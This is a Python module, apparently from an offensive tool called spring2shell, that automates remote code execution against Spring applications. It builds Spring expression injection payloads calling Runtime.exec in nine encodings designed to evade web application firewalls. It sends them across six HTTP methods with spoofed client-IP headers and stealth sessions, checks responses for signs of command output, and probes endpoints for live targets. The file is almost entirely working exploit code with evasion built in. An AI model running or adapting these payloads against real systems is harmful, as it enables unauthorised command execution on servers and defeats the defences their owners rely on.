"""
Aggressive WAF bypass runner for spring2shell.

Provides:
- aggressive_waf_bypass(): 9 WAF techniques × 6 HTTP methods with full header set
- find_working_endpoint():  quick 30-endpoint probe to identify live API endpoints
"""

from __future__ import annotations

import logging
import random
import time
import urllib.parse
from typing import Any

from spring2shell.core.session import create_stealth_session
from spring2shell.evasion.headers import get_random_headers
from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.signals import is_interrupted

_HTTP_METHODS = ["POST", "GET", "PUT", "PATCH", "DELETE", "OPTIONS"]

_WAF_TECHNIQUES: list[dict[str, Any]] = [
    {
        "name": "Double URL Encoding",
        "build": lambda cmd: (
            f'{{"query": "%257B%257BT%2528java.lang.Runtime%2529'
            f'.getRuntime%2528%2529.exec%2528%2522{cmd}%2522%2529%257D%257D"}}'
        ),
    },
    {
        "name": "Unicode Escape",
        "build": lambda cmd: (
            f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        ),
    },
    {
        "name": "Mixed Case Headers",
        "build": lambda cmd: (
            f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        ),
    },
    {
        "name": "Null Bytes",
        "build": lambda cmd: (
            f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        ),
    },
    {
        "name": "Extra Whitespace",
        "build": lambda cmd: (
            f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'
        ),
    },
    {
        "name": "JSON Wrapped",
        "build": lambda cmd: (
            f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'
        ),
    },
    {
        "name": "Form URL Encoded",
        "build": lambda cmd: (
            f"query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D"
        ),
    },
    {
        "name": "XML Content-Type",
        "build": lambda cmd: (
            f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'
        ),
    },
    {
        "name": "Chunked Encoding",
        "build": lambda cmd: (
            f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        ),
    },
]

_OUTPUT_INDICATORS = ["uid=", "gid=", "root:", "bin/", "etc/", "home/", "total ", "drwx"]
_API_INDICATORS = ["graphql", "json", "rest", "api", "query"]


def aggressive_waf_bypass(
    target_url: str,
    endpoint: str,
    command: str = "id",
) -> list[dict[str, Any]]:
    """Try all 9 WAF bypass techniques across 6 HTTP methods.

    Adds ``X-Real-IP``, ``CF-Connecting-IP``, ``Referer`` to requests for
    additional header-based bypass coverage.

    Args:
        target_url: Base URL of the target (used for logging and Referer header).
        endpoint:   Full endpoint URL to probe.
        command:    OS command to embed in payloads.

    Returns:
        List of result dicts for each technique/method pair that was NOT blocked
        (status code not 401/403).
    """
    log_event(
        logging.INFO,
        "aggressive_waf_bypass start",
        endpoint=endpoint,
        techniques=len(_WAF_TECHNIQUES),
        methods=len(_HTTP_METHODS),
    )
    results: list[dict[str, Any]] = []
    session = create_stealth_session("aggressive")

    for http_method in _HTTP_METHODS:
        for technique in _WAF_TECHNIQUES:
            if is_interrupted():
                return results
            try:
                payload = technique["build"](command)
                headers = get_random_headers()
                rand_ip = (
                    f"{random.randint(1, 255)}.{random.randint(1, 255)}"
                    f".{random.randint(1, 255)}.{random.randint(1, 255)}"
                )
                headers["X-Forwarded-For"] = rand_ip
                headers["X-Real-IP"] = rand_ip
                headers["CF-Connecting-IP"] = rand_ip
                headers["Referer"] = target_url

                if http_method == "GET":
                    params = (
                        {p.split("=")[0]: p.split("=")[1] for p in payload.split("&") if "=" in p}
                        if "form-urlencoded" in technique["name"].lower()
                        else {"query": payload}
                    )
                    response = session.get(endpoint, params=params, headers=headers, timeout=8)
                else:
                    response = session.request(
                        method=http_method,
                        url=endpoint,
                        data=payload,
                        headers=headers,
                        timeout=8,
                    )

                if response.status_code not in (403, 401):
                    found_indicators = [
                        ind for ind in _OUTPUT_INDICATORS if ind in response.text.lower()
                    ]
                    entry = {
                        "technique": technique["name"],
                        "method": http_method,
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "indicators": found_indicators,
                        "response_preview": response.text[:500],
                    }
                    results.append(entry)
                    log_event(
                        logging.INFO,
                        "WAF bypass not blocked",
                        technique=technique["name"],
                        method=http_method,
                        status=response.status_code,
                    )
                    if response.status_code == 200 and found_indicators:
                        log_event(
                            logging.WARNING,
                            "POTENTIAL EXPLOIT SUCCESS",
                            technique=technique["name"],
                        )
                        return results

                time.sleep(random.uniform(0.2, 0.8))
            except Exception as exc:
                log_swallowed_exception(
                    f"aggressive_waf_bypass {http_method} {technique['name']}", exc
                )

    log_event(logging.INFO, "aggressive_waf_bypass complete", bypasses=len(results))
    return results


def find_working_endpoint(target_url: str, limit: int = 30) -> list[dict[str, Any]]:
    """Quick probe of the first *limit* endpoints to find live API surfaces.

    A probe GET + POST per endpoint. Classifies as "working" if the response
    contains API indicators (graphql, json, rest, api, query) or has
    ``application/json`` Content-Type.

    Args:
        target_url: Base URL of the target.
        limit:      Maximum number of endpoints to probe (default 30).

    Returns:
        List of dicts with keys: ``url``, ``method``, ``status``, ``type``.
    """
    from spring2shell.discovery.endpoints import load_endpoints

    endpoints = load_endpoints()[:limit]
    session = create_stealth_session()
    headers = get_random_headers()
    probe_payload = '{"query": "test"}'
    working: list[dict[str, Any]] = []

    for ep in endpoints:
        if is_interrupted():
            break
        url = urllib.parse.urljoin(target_url.rstrip("/") + "/", ep.lstrip("/"))
        try:
            get_resp = session.get(url, headers=headers, timeout=3)
            if get_resp.status_code in (200, 400, 401, 403, 500):
                ct = get_resp.headers.get("Content-Type", "").lower()
                if "application/json" in ct or any(
                    ind in get_resp.text.lower() for ind in _API_INDICATORS
                ):
                    working.append(
                        {
                            "url": url,
                            "method": "GET",
                            "status": get_resp.status_code,
                            "type": "GET endpoint",
                        }
                    )
        except Exception:
            pass
        try:
            post_resp = session.post(url, data=probe_payload, headers=headers, timeout=3)
            if post_resp.status_code in (200, 400, 401, 403, 405, 500):
                ct = post_resp.headers.get("Content-Type", "").lower()
                if "application/json" in ct or any(
                    ind in post_resp.text.lower() for ind in _API_INDICATORS
                ):
                    working.append(
                        {
                            "url": url,
                            "method": "POST",
                            "status": post_resp.status_code,
                            "type": "API endpoint",
                        }
                    )
        except Exception:
            pass
        time.sleep(0.3)

    log_event(
        logging.INFO, "find_working_endpoint complete", target=target_url, working=len(working)
    )
    return working
